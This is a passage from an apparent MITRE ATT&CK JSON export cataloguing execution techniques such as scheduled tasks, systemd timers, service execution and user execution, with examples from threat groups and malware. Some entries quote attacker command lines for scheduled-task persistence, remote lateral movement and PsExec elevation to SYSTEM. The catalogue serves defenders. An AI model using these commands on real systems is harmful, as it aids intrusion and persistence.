"Operation CuckooBees", "description": "During Operation CuckooBees, the threat actors used scheduled tasks to execute batch scripts for lateral movement with the following command: SCHTASKS /Create /S <IP Address> /U <Username> /p <Password> /SC ONCE /TN test /TR <Path to a Batch File> /ST <Time> /RU SYSTEM."}, {"id": "C0022", "name": "Operation Dream Job", "description": "During Operation Dream Job, Lazarus Group created scheduled tasks to set a periodic execution of a remote XSL script."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors used scheduled tasks to execute malicious PowerShell code on remote systems."}, {"id": "G0040", "name": "Patchwork", "description": "A Patchwork file stealer can run a TaskScheduler DLL to add persistence."}, {"id": "S0194", "name": "PowerSploit", "description": "PowerSploit's New-UserPersistenceOption Persistence argument can be used to establish via a Scheduled Task/Job."}, {"id": "S0223", "name": "POWERSTATS", "description": "POWERSTATS has established persistence through a scheduled task using the command \"C:\\Windows\\system32\\schtasks.exe\" /Create /F /SC DAILY /ST 12:00 /TN MicrosoftEdge /TR \"c:\\Windows\\system32\\wscript.exe C:\\Windows\\temp\\Windows.vbe\"."}, {"id": "S0184", "name": "POWRUNER", "description": "POWRUNER persists through a scheduled task that executes it every minute."}, {"id": "S1058", "name": "Prestige", "description": "Prestige has been executed on a target system through a scheduled task created by Sandworm Team using Impacket."}, {"id": "S0147", "name": "Pteranodon", "description": "Pteranodon schedules tasks to invoke its components in order to establish persistence."}, {"id": "S0650", "name": "QakBot", "description": "QakBot has the ability to create scheduled tasks for persistence."}, {"id": "S0269", "name": "QUADAGENT", "description": "QUADAGENT creates a scheduled task to maintain persistence on the victim\u2019s machine."}, {"id": "S0262", "name": "QuasarRAT", "description": "QuasarRAT contains a .NET wrapper DLL for creating and managing scheduled tasks for maintaining persistence upon reboot."}, {"id": "S0629", "name": "RainyDay", "description": "RainyDay can use scheduled tasks to achieve persistence."}, {"id": "S0458", "name": "Ramsay", "description": "Ramsay can schedule tasks via the Windows COM API to maintain persistence."}, {"id": "G0075", "name": "Rancor", "description": "Rancor launched a scheduled task to gain persistence using the schtasks /create /sc command."}, {"id": "G1039", "name": "RedCurl", "description": "RedCurl has created scheduled tasks for persistence."}, {"id": "S0375", "name": "Remexi", "description": "Remexi utilizes scheduled tasks as a persistence mechanism."}, {"id": "S0166", "name": "RemoteCMD", "description": "RemoteCMD can execute commands remotely by creating a new schedule task on the remote system"}, {"id": "S0379", "name": "Revenge RAT", "description": "Revenge RAT schedules tasks to run malicious scripts at different intervals."}, {"id": "S0148", "name": "RTM", "description": "RTM tries to add a scheduled task to establish persistence."}, {"id": "S0446", "name": "Ryuk", "description": "Ryuk can remotely create a scheduled task to execute itself on a system."}, {"id": "S1018", "name": "Saint Bot", "description": "Saint Bot has created a scheduled task named \"Maintenance\" to establish persistence."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team leveraged SHARPIVORY, a .NET dropper that writes embedded payload to disk and uses scheduled tasks to persist on victim machines."}, {"id": "S0111", "name": "schtasks", "description": "schtasks is used to schedule tasks on a Windows system to run at a specific date and time."}, {"id": "S0382", "name": "ServHelper", "description": "ServHelper contains modules that will use schtasks to carry out malicious operations."}, {"id": "S0140", "name": "Shamoon", "description": "Shamoon copies an executable payload to the target system by using SMB/Windows Admin Shares and then scheduling an unnamed task to execute the malware."}, {"id": "S1089", "name": "SharpDisco", "description": "SharpDisco can create scheduled tasks to execute reverse shells that read and write data to and from specified SMB shares."}, {"id": "S0546", "name": "SharpStage", "description": "SharpStage has a persistence component to write a scheduled task for the payload."}, {"id": "S0589", "name": "Sibot", "description": "Sibot has been executed via a scheduled task."}, {"id": "G0091", "name": "Silence", "description": "Silence has used scheduled tasks to stage its operation."}, {"id": "S0226", "name": "Smoke Loader", "description": "Smoke Loader launches a scheduled task."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 used scheduler and schtasks to create new tasks on remote host as part of their lateral movement. They manipulated scheduled tasks by updating an existing legitimate task to execute their tools and then returned the scheduled task to its original configuration. APT29 also created a scheduled task to maintain SUNSPOT persistence when the host booted."}, {"id": "S0516", "name": "SoreFang", "description": "SoreFang can gain persistence through use of scheduled tasks."}, {"id": "S1140", "name": "Spica", "description": "Spica has created a scheduled task named CalendarChecker to establish persistence."}, {"id": "S0390", "name": "SQLRat", "description": "SQLRat has created scheduled tasks in %appdata%\\Roaming\\Microsoft\\Templates\\."}, {"id": "G0038", "name": "Stealth Falcon", "description": "Stealth Falcon malware creates a scheduled task entitled \"IE Web Cache\" to execute a malicious file hourly."}, {"id": "S0603", "name": "Stuxnet", "description": "Stuxnet schedules a network job to execute two minutes after host infection."}, {"id": "S1042", "name": "SUGARDUMP", "description": "SUGARDUMP has created scheduled tasks called MicrosoftInternetExplorerCrashRepoeterTaskMachineUA and MicrosoftEdgeCrashRepoeterTaskMachineUA, which were configured to execute CrashReporter.exe during user logon."}, {"id": "S1064", "name": "SVCReady", "description": "SVCReady can create a scheduled task named RecoveryExTask to gain persistence."}, {"id": "G1018", "name": "TA2541", "description": "TA2541 has used scheduled tasks to establish persistence for installed tools."}, {"id": "S1011", "name": "Tarrask", "description": "Tarrask is able to create \"hidden\" scheduled tasks for persistence."}, {"id": "G1022", "name": "ToddyCat", "description": "ToddyCat has used scheduled tasks to execute discovery commands and scripts for collection."}, {"id": "S0671", "name": "Tomiris", "description": "Tomiris has used SCHTASKS /CREATE /SC DAILY /TN StartDVL /TR \"[path to self]\" /ST 10:00 to establish persistence."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot creates a scheduled task on the system that provides persistence."}, {"id": "C0030", "name": "Triton Safety Instrumented System Attack", "description": "In the Triton Safety Instrumented System Attack, TEMP.Veles installed scheduled tasks defined in XML files."}, {"id": "S0476", "name": "Valak", "description": "Valak has used scheduled tasks to execute additional payloads and to gain persistence on a compromised host."}, {"id": "G1035", "name": "Winter Vivern", "description": "Winter Vivern executed PowerShell scripts that would subsequently attempt to establish persistence by creating scheduled tasks objects to periodically retrieve and execute remotely-hosted payloads."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has used scheduled tasks to establish persistence for TrickBot and other malware."}, {"id": "S0248", "name": "yty", "description": "yty establishes persistence by creating a scheduled task with the command SchTasks /Create /SC DAILY /TN BigData /TR \" + path_file + \"/ST 09:30\"."}, {"id": "S0251", "name": "Zebrocy", "description": "Zebrocy has a command to create a scheduled task for persistence."}, {"id": "S0350", "name": "zwShell", "description": "zwShell has used SchTasks for execution."}, {"id": "S1013", "name": "ZxxZ", "description": "ZxxZ has used scheduled tasks for persistence and execution."}]}, {"name": "Systemd Timers", "description": "Adversaries may abuse systemd timers to perform task scheduling for initial or recurring execution of malicious code. Systemd timers are unit files with file extension .timer that control services. Timers can be set to run on a calendar event or after a time span relative to a starting point. They can be used as an alternative to Cron in Linux environments. Systemd timers may be activated remotely via the systemctl command line utility, which operates over SSH.", "detailed_description": "Adversaries may abuse systemd timers to perform task scheduling for initial or recurring execution of malicious code. Systemd timers are unit files with file extension .timer that control services. Timers can be set to run on a calendar event or after a time span relative to a starting point. They can be used as an alternative to Cron in Linux environments. Systemd timers may be activated remotely via the systemctl command line utility, which operates over SSH.\nEach .timer file must have a corresponding .service file with the same name, e.g., example.timer and example.service. .service files are Systemd Service unit files that are managed by the systemd system and service manager. Privileged timers are written to /etc/systemd/system/ and /usr/lib/systemd/system while user level are written to ~/.config/systemd/user/.\nAn adversary may use systemd timers to execute malicious code at system startup or on a scheduled basis for persistence. Timers installed using privileged paths may be used to maintain root level persistence. Adversaries may also install user level timers to achieve user level persistence.", "id": "T1053.006", "examples": []}, {"name": "Container Orchestration Job", "description": "Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.", "detailed_description": "Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.\nIn Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks. An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster.", "id": "T1053.007", "examples": []}]}, {"name": "Serverless Execution", "description": "Adversaries may abuse serverless computing, integration, and automation services to execute arbitrary code in cloud environments. Many cloud providers offer a variety of serverless resources, including compute engines, application integration services, and web servers.", "detailed_description": "Adversaries may abuse serverless computing, integration, and automation services to execute arbitrary code in cloud environments. Many cloud providers offer a variety of serverless resources, including compute engines, application integration services, and web servers.\nAdversaries may abuse these resources in various ways as a means of executing arbitrary commands. For example, adversaries may use serverless functions to execute malicious code, such as crypto-mining malware (i.e. Resource Hijacking). Adversaries may also create functions that enable further compromise of the cloud environment. For example, an adversary may use the IAM:PassRole permission in AWS or the iam.serviceAccounts.actAs permission in Google Cloud to add Additional Cloud Roles to a serverless cloud function, which may then be able to perform actions the original user cannot.\nServerless functions can also be invoked in response to cloud events (i.e. Event Triggered Execution), potentially enabling persistent execution over time. For example, in AWS environments, an adversary may create a Lambda function that automatically adds Additional Cloud Credentials to a user and a corresponding CloudWatch events rule that invokes that function whenever a new user is created. This is also possible in many cloud-based office application suites. For example, in Microsoft 365 environments, an adversary may create a Power Automate workflow that forwards all emails a user receives or creates anonymous sharing links whenever a user is granted access to a document in SharePoint. In Google Workspace environments, they may instead create an Apps Script that exfiltrates a user's data when they open a file.", "id": "T1648", "examples": [{"id": "S1091", "name": "Pacu", "description": "Pacu can create malicious Lambda functions."}], "sub_techniques": []}, {"name": "Shared Modules", "description": "Adversaries may execute malicious payloads via loading shared modules. Shared modules are executable files that are loaded into processes to provide access to reusable code, such as specific custom functions or invoking OS API functions (i.e., Native API).", "detailed_description": "Adversaries may execute malicious payloads via loading shared modules. Shared modules are executable files that are loaded into processes to provide access to reusable code, such as specific custom functions or invoking OS API functions (i.e., Native API).\nAdversaries may use this functionality as a way to execute arbitrary payloads on a victim system. For example, adversaries can modularize functionality of their malware into shared objects that perform various functions such as managing C2 network communications or execution of specific actions on objective.\nThe Linux & macOS module loader can load and execute shared objects from arbitrary local paths. This functionality resides in dlfcn.h in functions such as dlopen and dlsym. Although macOS can execute .so files, common practice uses .dylib files.\nThe Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows Native API which is called from functions like LoadLibrary at run time.", "id": "T1129", "examples": [{"id": "S0373", "name": "Astaroth", "description": "Astaroth uses the LoadLibraryExW() function to load additional modules. "}, {"id": "S0438", "name": "Attor", "description": "Attor's dispatcher can execute additional plugins by loading the respective DLLs."}, {"id": "S0520", "name": "BLINDINGCAN", "description": "BLINDINGCAN has loaded and executed DLLs in memory during runtime on a victim machine."}, {"id": "S0415", "name": "BOOSTWRITE", "description": "BOOSTWRITE has used the DWriteCreateFactory() function to load additional modules."}, {"id": "S1039", "name": "Bumblebee", "description": "Bumblebee can use LoadLibrary to attempt to execute GdiPlus.dll."}, {"id": "S0673", "name": "DarkWatchman", "description": "DarkWatchman can load DLLs."}, {"id": "S0567", "name": "Dtrack", "description": "Dtrack contains a function that calls LoadLibrary and GetProcAddress."}, {"id": "S0377", "name": "Ebury", "description": "Ebury is executed through hooking the keyutils.so file used by legitimate versions of OpenSSH and libcurl."}, {"id": "S0661", "name": "FoggyWeb", "description": "FoggyWeb's loader can call the load() function to load the FoggyWeb dll into an Application Domain on a compromised AD FS server."}, {"id": "S0032", "name": "gh0st RAT", "description": "gh0st RAT can load DLLs into memory."}, {"id": "S0203", "name": "Hydraq", "description": "Hydraq creates a backdoor through which remote attackers can load and call DLL functions."}, {"id": "S0607", "name": "KillDisk", "description": "KillDisk loads and executes functions from a DLL."}, {"id": "S0455", "name": "Metamorfo", "description": "Metamorfo had used AutoIt to load and execute the DLL payload."}, {"id": "S0352", "name": "OSX_OCEANLOTUS.D", "description": "For network communications, OSX_OCEANLOTUS.D loads a dynamic library (.dylib file) using dlopen() and obtains a function pointer to execute within that shared library using dlsym()."}, {"id": "S0501", "name": "PipeMon", "description": "PipeMon has used call to LoadLibrary to load its installer. PipeMon loads its modules using reflective loading or custom shellcode."}, {"id": "S0196", "name": "PUNCHBUGGY", "description": "PUNCHBUGGY can load a DLL using the LoadLibrary API."}, {"id": "S1078", "name": "RotaJakiro", "description": "RotaJakiro uses dynamically linked shared libraries (.so files) to execute additional functionality using dlopen() and dlsym()."}, {"id": "S0603", "name": "Stuxnet", "description": "Stuxnet calls LoadLibrary then executes exports from a DLL."}, {"id": "S0467", "name": "TajMahal", "description": "TajMahal has the ability to inject the LoadLibrary call template DLL into running processes."}, {"id": "S1154", "name": "VersaMem", "description": "VersaMem relied on the Java Instrumentation API and Javassist to dynamically modify Java code existing in memory."}], "sub_techniques": []}, {"name": "Software Deployment Tools", "description": "Adversaries may gain access to and use centralized software suites installed within an enterprise to execute commands and move laterally through the network. Configuration management and software deployment applications may be used in an enterprise network or cloud environment for routine administration purposes. These systems may also be integrated into CI/CD pipelines. Examples of such solutions include: SCCM, HBSS, Altiris, AWS Systems Manager, Microsoft Intune, Azure Arc, and GCP Deployment Manager.", "detailed_description": "Adversaries may gain access to and use centralized software suites installed within an enterprise to execute commands and move laterally through the network. Configuration management and software deployment applications may be used in an enterprise network or cloud environment for routine administration purposes. These systems may also be integrated into CI/CD pipelines. Examples of such solutions include: SCCM, HBSS, Altiris, AWS Systems Manager, Microsoft Intune, Azure Arc, and GCP Deployment Manager.\nAccess to network-wide or enterprise-wide endpoint management software may enable an adversary to achieve remote code execution on all connected systems. The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.\nSaaS-based configuration management services may allow for broad Cloud Administration Command on cloud-hosted instances, as well as the execution of arbitrary commands on on-premises endpoints. For example, Microsoft Configuration Manager allows Global or Intune Administrators to run scripts as SYSTEM on on-premises devices joined to Entra ID. Such services may also utilize Web Protocols to communicate back to adversary owned infrastructure.\nNetwork infrastructure devices may also have configuration management tools that can be similarly abused by adversaries.\nThe permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required. However, the system may require an administrative account to log in or to access specific functionality.", "id": "T1072", "examples": [{"id": "G0050", "name": "APT32", "description": "APT32 compromised McAfee ePO to move laterally by distributing malware as a software deployment task."}, {"id": "C0018", "name": "C0018", "description": "During C0018, the threat actors used PDQ Deploy to move AvosLocker and tools across the network."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team has used the commercially available tool RemoteExec for agentless remote code execution."}, {"id": "G0091", "name": "Silence", "description": "Silence has used RAdmin, a remote software tool used to remotely control workstations and ATMs."}, {"id": "G0028", "name": "Threat Group-1314", "description": "Threat Group-1314 actors used a victim's endpoint management platform, Altiris, for lateral movement."}, {"id": "S0041", "name": "Wiper", "description": "It is believed that a patch management system for an anti-virus product commonly installed among targeted companies was used to distribute the Wiper malware."}], "sub_techniques": []}, {"name": "System Services", "description": "Adversaries may abuse system services or daemons to execute commands or programs. Adversaries can execute malicious content by interacting with or creating services either locally or remotely. Many services are set to run at boot, which can aid in achieving persistence (Create or Modify System Process), but adversaries can also abuse services for one-time or temporary execution.", "detailed_description": "Adversaries may abuse system services or daemons to execute commands or programs. Adversaries can execute malicious content by interacting with or creating services either locally or remotely. Many services are set to run at boot, which can aid in achieving persistence (Create or Modify System Process), but adversaries can also abuse services for one-time or temporary execution.", "id": "T1569", "examples": [{"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has created system services to execute cryptocurrency mining software."}], "sub_techniques": [{"name": "Launchctl", "description": "Adversaries may abuse launchctl to execute commands or programs. Launchctl interfaces with launchd, the service management framework for macOS. Launchctl supports taking subcommands on the command-line, interactively, or even redirected from standard input.", "detailed_description": "Adversaries may abuse launchctl to execute commands or programs. Launchctl interfaces with launchd, the service management framework for macOS. Launchctl supports taking subcommands on the command-line, interactively, or even redirected from standard input.\nAdversaries use launchctl to execute commands and programs as Launch Agents or Launch Daemons. Common subcommands include: launchctl load,launchctl unload, and launchctl start. Adversaries can use scripts or manually run the commands launchctl load -w \"%s/Library/LaunchAgents/%s\" or /bin/launchctl load to execute Launch Agents or Launch Daemons.", "id": "T1569.001", "examples": [{"id": "S0584", "name": "AppleJeus", "description": "AppleJeus has loaded a plist file using the launchctl command."}, {"id": "S0274", "name": "Calisto", "description": "Calisto uses launchctl to enable screen sharing on the victim\u2019s machine."}, {"id": "S1153", "name": "Cuckoo Stealer", "description": "Cuckoo Stealer can use launchctl to load a LaunchAgent for persistence."}, {"id": "S0451", "name": "LoudMiner", "description": "LoudMiner launched the QEMU services in the /Library/LaunchDaemons/ folder using launchctl. It also uses launchctl to unload all Launch Daemons when updating to a newer version of LoudMiner."}, {"id": "S1048", "name": "macOS.OSAMiner", "description": "macOS.OSAMiner has used launchctl to restart the Launch Agent."}, {"id": "S0658", "name": "XCSSET", "description": "XCSSET loads a system level launchdaemon using the launchctl load -w command from /System/Librarby/LaunchDaemons/ssh.plist."}]}, {"name": "Service Execution", "description": "Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (services.exe) is an interface to manage and manipulate services. The service control manager is accessible to users via GUI components as well as system utilities such as sc.exe and Net.", "detailed_description": "Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (services.exe) is an interface to manage and manipulate services. The service control manager is accessible to users via GUI components as well as system utilities such as sc.exe and Net.\nPsExec can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API. Tools such as PsExec and sc.exe can accept remote servers as arguments and may be used to conduct remote execution.\nAdversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with Windows Service during service persistence or privilege escalation.", "id": "T1569.002", "examples": [{"id": "S0504", "name": "Anchor", "description": "Anchor can create and execute services to load its payload."}, {"id": "G0050", "name": "APT32", "description": "APT32's backdoor has used Windows services as a way to execute its malicious payload. "}, {"id": "G0082", "name": "APT38", "description": "APT38 has created new services or modified existing ones to run executables, commands, or scripts."}, {"id": "G0087", "name": "APT39", "description": "APT39 has used post-exploitation tools including RemCom and the Non-sucking Service Manager (NSSM) to execute processes."}, {"id": "G0096", "name": "APT41", "description": "APT41 used  svchost.exe and Net to execute a system service installed to launch a Cobalt Strike BEACON loader."}, {"id": "C0040", "name": "APT41 DUST", "description": "APT41 DUST used Windows services to execute DUSTPAN."}, {"id": "S0438", "name": "Attor", "description": "Attor's dispatcher can be executed as a service."}, {"id": "S0606", "name": "Bad Rabbit", "description": "Bad Rabbit drops a file named infpub.datinto the Windows directory and is executed through SCManager and rundll.exe."}, {"id": "S0127", "name": "BBSRAT", "description": "BBSRAT can start, stop, or delete services."}, {"id": "G0108", "name": "Blue Mockingbird", "description": "Blue Mockingbird has executed custom-compiled XMRIG miner DLLs by configuring them to execute via the \"wercplsupport\" service."}, {"id": "S1063", "name": "Brute Ratel C4", "description": "Brute Ratel C4 can create Windows system services for execution."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has used PsExec to deploy beacons on compromised systems."}, {"id": "S0660", "name": "Clambling", "description": "Clambling can create and start services on a compromised host."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can use PsExec to execute a payload on a remote host. It can also use Service Control Manager to start new services."}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate tries to elevate privileges to SYSTEM using PsExec to locally execute as a service, such as cmd /c c:\\temp\\PsExec.exe -accepteula -j -d -s [Target Binary]."}, {"id": "S1134", "name": "DEADWOOD", "description": "DEADWOOD can be executed as a service using various names, such as ScDeviceEnums."}, {"id": "S0363", "name": "Empire", "description": "Empire can use PsExec to execute a payload on a remote host."}, {"id": "G0037", "name": "FIN6", "description": "FIN6 has created Windows services to execute encoded PowerShell commands."}, {"id": "S0032", "name": "gh0st RAT", "description": "gh0st RAT can execute its service if the Service key exists. If the key does not exist, gh0st RAT will create and run the service."}, {"id": "S0697", "name": "HermeticWiper", "description": "HermeticWiper can create system services to aid in executing the payload."}, {"id": "S0698", "name": "HermeticWizard", "description": "HermeticWizard can use OpenRemoteServiceManager to create a service."}, {"id": "S0376", "name": "HOPLIGHT", "description": "HOPLIGHT has used svchost.exe to execute a malicious DLL ."}, {"id": "S0203", "name": "Hydraq", "description": "Hydraq uses svchost.exe to execute a malicious DLL included in a new service group."}, {"id": "S0398", "name": "HyperBro", "description": "HyperBro has the ability to start and stop a specified service."}, {"id": "S0357", "name": "Impacket", "description": "Impacket contains various modules emulating other service execution tools such as PsExec."}, {"id": "G1032", "name": "INC Ransom", "description": "INC Ransom has run a file encryption executable via Service Control Manager/7045;winupd,%SystemRoot%\\winupd.exe,user mode service,demand start,LocalSystem."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole has used Windows services as a way to execute its malicious payload."}, {"id": "S1132", "name": "IPsec Helper", "description": "IPsec Helper is run as a Windows service in victim environments."}, {"id": "G0004", "name": "Ke3chang", "description": "Ke3chang has used a tool known as RemoteExec (similar to PsExec) to remotely execute batch scripts and binaries."}, {"id": "S0250", "name": "Koadic", "description": "Koadic can run a command on another machine using PsExec."}, {"id": "S0451", "name": "LoudMiner", "description": "LoudMiner started the cryptomining virtual machine as a service on the infected machine."}, {"id": "S1060", "name": "Mafalda", "description": "Mafalda can create a remote service, let it run once, and then delete it."}, {"id": "G1036", "name": "Moonstone Sleet", "description": "Moonstone Sleet used intermediate loader malware such as YouieLoader and SplitLoader that create malicious services."}, {"id": "S0039", "name": "Net", "description": "The net start and net stop commands can be used in Net to execute or stop Windows services."}, {"id": "S0056", "name": "Net Crawler", "description": "Net Crawler uses PsExec to perform remote service manipulation to execute a copy of itself as part of lateral movement."}, {"id": "S0457", "name": "Netwalker", "description": "Operators deploying Netwalker have used psexec and certutil to retrieve the Netwalker payload."}, {"id": "S0368", "name": "NotPetya", "description": "NotPetya can use PsExec to help propagate itself across a network."}, {"id": "S0439", "name": "Okrum", "description": "Okrum's loader can create a new service named NtmsSvc to execute the payload."}, {"id": "S0365", "name": "Olympic Destroyer", "description": "Olympic Destroyer utilizes PsExec to help propagate itself across a network."}, {"id": "C0006", "name": "Operation Honeybee", "description": "During Operation Honeybee, threat actors ran sc start to start the COMSysApp as part of the service hijacking and sc stop to stop and reconfigure the COMSysApp."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors created services on remote systems for execution purposes."}, {"id": "S0664", "name": "Pandora", "description": "Pandora has the ability to install itself as a Windows service."}, {"id": "S0378", "name": "PoshC2", "description": "PoshC2 contains an implementation of PsExec for remote execution."}, {"id": "S0238", "name": "Proxysvc", "description": "Proxysvc registers itself as a service on the victim\u2019s machine to run as a standalone process."}, {"id": "S0029", "name": "PsExec", "description": "Microsoft Sysinternals PsExec is a popular administration tool that can be used to execute binaries on remote systems using a temporary Windows service."}, {"id": "S0192", "name": "Pupy", "description": "Pupy uses PsExec to execute a payload or commands on a remote host."}, {"id": "S0583", "name": "Pysa", "description": "Pysa has used PsExec to copy and execute the ransomware."}, {"id": "S0481", "name": "Ragnar Locker", "description": "Ragnar Locker has used sc.exe to execute a service that it creates."}, {"id": "S0166", "name": "RemoteCMD", "description": "RemoteCMD can execute commands remotely by creating a new service on the remote system."}, {"id": "S0140", "name": "Shamoon", "description": "Shamoon creates a new service named \"ntssrv\" to execute the payload. Shamoon can also spread via PsExec."}, {"id": "G0091", "name": "Silence", "description": "Silence has used Winexe to install a service on the remote system."}, {"id": "S0533", "name": "SLOTHFULMEDIA", "description": "SLOTHFULMEDIA has the capability to start services."}, {"id": "S0491", "name": "StrongPity", "description": "StrongPity can install a service to execute itself as a service."}, {"id": "S0663", "name": "SysUpdate", "description": "SysUpdate can manage services and processes."}, {"id": "S0668", "name": "TinyTurla", "description": "TinyTurla can install itself as a service on compromised machines."}, {"id": "S0612", "name": "WastedLocker", "description": "WastedLocker can execute itself as a service."}, {"id": "S0689", "name": "WhisperGate", "description": "WhisperGate can download and execute AdvancedRun.exe via sc.exe."}, {"id": "S0191", "name": "Winexe", "description": "Winexe installs a service on the remote system, executes the command, then uninstalls the service."}, {"id": "S0176", "name": "Wingbird", "description": "Wingbird uses services.exe to register a new autostart service named \"Audit Service\" using a copy of the local lsass.exe file."}, {"id": "S0141", "name": "Winnti for Windows", "description": "Winnti for Windows can run as a service using svchost.exe."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has used services.exe to execute scripts and executables during lateral movement within a victim's network. Wizard Spider has also used batch scripts that leverage PsExec to execute a previously transferred ransomware payload on a victim's network."}, {"id": "S0123", "name": "xCmd", "description": "xCmd can be used to execute binaries on remote systems by creating and starting a service."}, {"id": "S0412", "name": "ZxShell", "description": "ZxShell can create a new service for execution."}]}]}, {"name": "User Execution", "description": "An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of Phishing.", "detailed_description": "An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of Phishing.\nWhile User Execution frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after Internal Spearphishing.\nAdversaries may also deceive users into performing actions such as:\nFor example, tech support scams can be facilitated through Phishing, vishing, or various forms of user interaction. Adversaries can use a combination of these methods, such as spoofing and promoting toll-free numbers or call centers that are used to direct victims to malicious websites, to deliver and execute payloads containing malware or Remote Access Software.", "id": "T1204", "examples": [{"id": "G1004", "name": "LAPSUS$", "description": "LAPSUS$ has recruited target organization employees or contractors who provide credentials and approve an associated MFA prompt, or install remote management software onto a corporate workstation, allowing LAPSUS$ to take control of an authenticated system."}, {"id": "S1130", "name": "Raspberry Robin", "description": "Raspberry Robin execution can rely on users directly interacting with malicious LNK files."}, {"id": "G1015", "name": "Scattered Spider", "description": "Scattered Spider has impersonated organization IT and helpdesk staff to instruct victims to execute commercial remote access tools to gain initial access."}, {"id": "C0037", "name": "Water Curupira Pikabot Distribution", "description": "Water Curupira Pikabot Distribution requires users to interact with malicious attachments in order to start Pikabot installation."}], "sub_techniques": [{"name": "Malicious Link", "description": "An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Link. Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via Exploitation for Client Execution. Links may also lead users to download files that require execution via Malicious File.", "detailed_description": "An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Link. Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via Exploitation for Client Execution. Links may also lead users to download files that require execution via Malicious File.", "id": "T1204.001", "examples": [{"id": "S0584", "name": "AppleJeus", "description": "AppleJeus's spearphishing links required user interaction to navigate to the malicious website."}, {"id": "G0007", "name": "APT28", "description": "APT28 has tricked unwitting recipients into clicking on malicious hyperlinks within emails crafted to resemble trustworthy senders."}, {"id": "G0016", "name": "APT29", "description": "APT29 has used various forms of spearphishing attempting to get a user to click on a malicious link."}, {"id": "G0022", "name": "APT3", "description": "APT3 has lured victims into clicking malicious links delivered through spearphishing."}, {"id": "G0050", "name": "APT32", "description": "APT32 has lured targets to download a Cobalt Strike beacon by including a malicious link within spearphishing emails."}, {"id": "G0064", "name": "APT33", "description": "APT33 has lured users to click links to malicious HTML applications delivered via spearphishing emails."}, {"id": "G0087", "name": "APT39", "description": "APT39 has sent spearphishing emails in an attempt to lure users to click on a malicious link."}, {"id": "S0475", "name": "BackConfig", "description": "BackConfig has compromised victims via links to URLs hosting malicious content."}, {"id": "S0534", "name": "Bazar", "description": "Bazar can gain execution after a user clicks on a malicious link to decoy landing pages hosted on Google Docs."}, {"id": "G0098", "name": "BlackTech", "description": "BlackTech has used e-mails with malicious links to lure victims into installing malware."}, {"id": "S1039", "name": "Bumblebee", "description": "Bumblebee has relied upon a user downloading a file from a OneDrive link for execution."}, {"id": "C0011", "name": "C0011", "description": "During C0011, Transparent Tribe relied on student targets to click on a malicious link sent via email."}, {"id": "C0021", "name": "C0021", "description": "During C0021, the threat actors lured users into clicking a malicious link which led to the download of a  ZIP archive containing a malicious .LNK file."}, {"id": "G0080", "name": "Cobalt Group", "description": "Cobalt Group has sent emails containing malicious links that require users to execute a file or macro to infect the victim machine."}, {"id": "G0142", "name": "Confucius", "description": "Confucius has lured victims into clicking on a malicious link sent through spearphishing."}, {"id": "G1034", "name": "Daggerfly", "description": "Daggerfly has used strategic website compromise to deliver a malicious link requiring user interaction."}, {"id": "G1006", "name": "Earth Lusca", "description": "Earth Lusca  has sent spearphishing emails that required the user to click on a malicious link and subsequently open a decoy document with a malicious loader."}, {"id": "G0066", "name": "Elderwood", "description": "Elderwood has leveraged multiple types of spearphishing in order to attempt to get a user to open links."}, {"id": "S0367", "name": "Emotet", "description": "Emotet has relied upon users clicking on a malicious link delivered through spearphishing."}, {"id": "G0120", "name": "Evilnum", "description": "Evilnum has sent spearphishing emails designed to trick the recipient into opening malicious shortcut links which downloads a .LNK file."}, {"id": "G1011", "name": "EXOTIC LILY", "description": "EXOTIC LILY has used malicious links to lure users into executing malicious payloads."}, {"id": "G0085", "name": "FIN4", "description": "FIN4 has lured victims to click malicious links delivered via spearphishing emails (often sent from compromised accounts)."}, {"id": "G0046", 